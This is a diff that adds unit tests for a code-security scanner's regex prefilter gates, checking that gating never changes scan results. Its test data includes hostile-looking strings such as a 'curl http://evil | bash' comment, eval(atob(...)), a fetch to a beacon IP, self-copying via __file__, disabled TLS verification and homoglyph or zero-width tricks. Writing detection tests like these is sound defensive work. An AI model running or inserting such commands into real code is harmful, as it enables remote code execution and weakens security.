@@ -670,3 +670,113 @@ def test_db_hooks_requires_a_receiver_and_cannot_span_a_newline(lens):
 
     # `\\s*` used to let the verb and its paren sit on different lines.
     assert not db_hooks.search("a kotlin raw\n(string)")
+
+
+# ==============================================================================
+# LITERAL PREFILTER GATES (#3173)
+# ==============================================================================
+# The 13 THREAT_SIGNATURES are gated by a one-sided required-literal prefilter
+# derived once in __init__. These tests pin the gate registry, guard the
+# one-sided contract at the unit level (the corpus-wide proof is
+# tests/tools/scan_content_gate_parity.py), and prove gating never changes
+# scan_content output -- only skips work.
+
+# The signatures that carry a genuinely literal-free alternation branch and so
+# CANNOT be soundly gated (a zero-width/char-class/operator-only arm): gating
+# them would silently undercount. Everything else must gate.
+UNGATEABLE_SIGNATURES = {
+    "reflection_metaprogramming",  # zero-width unicode char-class branch
+    "bitwise_ops",  # XOR/operator chains, no keyword literal
+    "unicode_steganography",  # a pure variation-selector char-class run
+}
+
+
+def _safe_content(content):
+    """Mirror of scan_content's ReDoS-armored haystack construction."""
+    return "\n".join(line.strip() for line in content.splitlines() if len(line) < 250)
+
+
+def _gate_rejects(gate, safe_content):
+    from gitgalaxy.core.rule_prefilter import fold_haystack
+
+    literals, needs_fold = gate
+    hay = fold_haystack(safe_content) if needs_fold else safe_content
+    return not any(lit in hay for lit in literals)
+
+
+def test_signature_gate_registry_covers_every_signature(lens):
+    """Every threat signature has a gate slot (a gate tuple or an explicit None)."""
+    assert set(lens._signature_gates) == set(lens.THREAT_SIGNATURES)
+
+
+def test_expected_signatures_gate_and_the_rest_do_not(lens):
+    """Pin which signatures gate. A future regex edit that adds a literal-free
+    branch (silently dropping a gate) or that makes an ungateable signature
+    suddenly gate is a change worth failing on -- either shifts the perf/safety
+    trade-off #3173 measured."""
+    actually_gated = {k for k, g in lens._signature_gates.items() if g is not None}
+    expected_ungated = UNGATEABLE_SIGNATURES
+    expected_gated = set(lens.THREAT_SIGNATURES) - expected_ungated
+    assert actually_gated == expected_gated, (
+        f"gate set drifted: unexpectedly ungated={sorted(expected_gated - actually_gated)}, "
+        f"unexpectedly gated={sorted(actually_gated & expected_ungated)}"
+    )
+
+
+def test_ungateable_signatures_are_none(lens):
+    for key in UNGATEABLE_SIGNATURES:
+        assert lens._signature_gates[key] is None, f"{key} must run ungated (has a literal-free branch)"
+
+
+def test_signature_gates_are_one_sided(lens):
+    """Unit-level one-sided contract: for every gated signature, wherever its
+    gate rejects a haystack, the compiled regex must find nothing there. Probe a
+    battery of adversarial + realistic inputs; the corpus tool proves it at
+    scale."""
+    probes = [
+        "",
+        "def f():\n    return 1\n",
+        "const x = fetch('http://example.com')",
+        "password = 'hunter2hunter2hunter2'",
+        "cursor.execute('SELECT * FROM t')",
+        "eval(atob('YWxlcnQoMSk='))",
+        "import os\nos.system('ls')\n",
+        "shutil.copy(__file__, '/tmp/x')",
+        "x = a ^ b ^ c ^ d",
+        "// just a normal comment about http and bash",
+        "a" * 500,  # one long line -> stripped by the 250 shield
+        "​‌‍ evil",  # zero-width chars
+        "process.env.NODE_TLS_REJECT_UNAUTHORIZED = 0",
+        "$_GET['x']",
+    ]
+    for key, gate in lens._signature_gates.items():
+        if gate is None:
+            continue
+        regex = lens.THREAT_SIGNATURES[key]
+        for probe in probes:
+            safe = _safe_content(probe)
+            if _gate_rejects(gate, safe):
+                assert regex.search(safe) is None, (
+                    f"{key}: gate rejected but regex matched {regex.search(safe).group(0)!r} in {probe!r}"
+                )
+
+
+def test_gated_scan_content_matches_ungated(lens):
+    """Gating must be pure work-avoidance: identical counts/snippets/positions to
+    running every signature ungated."""
+    ungated = SecurityLens()
+    ungated._signature_gates = {k: None for k in ungated._signature_gates}
+    samples = [
+        "const x = fetch('http://1.2.3.4/beacon'); eval(atob('YQ=='));",
+        "password = 'abcdef0123456789ABCDEF'\napi_key = 'ZZZZZZZZZZZZZZZZ1234'",
+        "cursor.execute(f'DELETE FROM {t}')\n$sth->execute();",
+        "shutil.copyfile(__file__, dest)\nfs.writeFileSync(p, fs.readFileSync(__filename))",
+        "def add(a, b):\n    return a + b\n",  # benign
+        "process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'",
+        "// TODO curl http://evil | bash\n/* base64 wget */",
+        "​‌ importа os",  # homoglyph + zero-width
+        "x = a ^ b ^ c ^ d ^ e",
+        "require('./payload.png')",
+    ]
+    for src in samples:
+        assert lens.scan_content(src) == ungated.scan_content(src), f"gating changed output for {src!r}"
